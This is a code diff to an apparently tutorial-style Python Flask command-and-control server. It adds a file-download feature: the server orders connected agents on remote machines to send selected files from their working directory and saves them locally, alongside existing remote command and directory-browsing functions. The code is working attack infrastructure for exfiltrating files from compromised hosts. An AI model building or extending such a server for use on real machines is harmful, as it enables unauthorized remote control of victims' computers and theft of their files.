@@ -25,6 +25,7 @@ FILE_OUTPUT=[]
 IPS = []
 CWD=[]
 BUFFER_SIZE = 4096*10
+TO_DOWNLOAD=[]
 CURRENT_WORKING_DIR = "D:\\python\\c2_yt"
 GOT_OUTPUT = 0
 
@@ -37,6 +38,7 @@ for i in range(50):
     FILE_OUTPUT.append('')
     IPS.append('')
     CWD.append('.')
+    TO_DOWNLOAD.append('')
 
 app = Flask(__name__)
 
@@ -50,7 +52,10 @@ def close_connection(connection,thread_index):
 def handle_connection(connection,address,thread_index):
     global CMD_OUTPUT
     global CMD_INPUT
-    
+    global FILE_INPUT
+    global FILE_OUTPUT
+    global CWD
+    global TO_DOWNLOAD
     
     while CMD_INPUT[thread_index]!='quit':
         #connection.settimeout(5)
@@ -62,10 +67,29 @@ def handle_connection(connection,address,thread_index):
             #msg = connection.recv(BUFFER_SIZE).decode()
         CMD_OUTPUT[thread_index] = msg
         while True:
-            if CMD_INPUT[thread_index]!='' or FILE_INPUT[thread_index]!='':
+            if CMD_INPUT[thread_index]!='' or FILE_INPUT[thread_index]!='' or TO_DOWNLOAD[thread_index]!='':
+
+                if TO_DOWNLOAD[thread_index]!='':
+                    # download-lengthoffiles
+                    downloads = TO_DOWNLOAD[thread_index]
+                    msg="download-"+str(len(downloads))+"-"+CWD[thread_index][0:-1]
+                    #print(address)
+                    connection.send(msg.encode())
+                    #print("sent to client")
+                    time.sleep(2)
+                    for i in range(len(downloads)):
+                        connection.send(downloads[i].encode())
+                        filecontents = connection.recv(BUFFER_SIZE*10)
+                        f = open(downloads[i],'wb')
+                        f.write(filecontents)
+                        f.close()
+                    msg = connection.recv(BUFFER_SIZE)
+                    CMD_OUTPUT[thread_index]=msg
+                    TO_DOWNLOAD[thread_index]=''
 
 
-                if FILE_INPUT[thread_index]!='':
+
+                elif FILE_INPUT[thread_index]!='':
                     # getdirectorycontents-directoryname
                     msg = "getdirectorycontents-"+FILE_INPUT[thread_index]
                     connection.send(msg.encode())
@@ -356,6 +380,26 @@ def filemanager(agentname):
     return render_template("filemanager.html",cwd=CWD[req_index],fileoutput=fileoutput,agentname=agentname)
     #pass 
  
+
+
+@app.route("/<agentname>/downloadfiles",methods=["GET","POST"])
+def downloadfiles(agentname):
+    for i in THREADS:
+        if agentname in i.name:
+            req_index = THREADS.index(i)
+    #print(req_index)
+    filenames = request.args.getlist("checkbox2")
+    cwd = request.args.get('cwd')
+    print(filenames)
+    TO_DOWNLOAD[req_index] = filenames
+    fileoutput = FILE_OUTPUT[req_index].split('\n')
+    print(fileoutput[0])
+    CWD[req_index] = fileoutput[0]
+    fileoutput = fileoutput[1:]
+    for i in range(len(fileoutput)):
+        fileoutput[i]=list(fileoutput[i].split("->"))
+    return render_template("filemanager.html",cwd=cwd,agentname=agentname,fileoutput=fileoutput)
+
 
 if __name__=='__main__':
     app.run(debug=True)
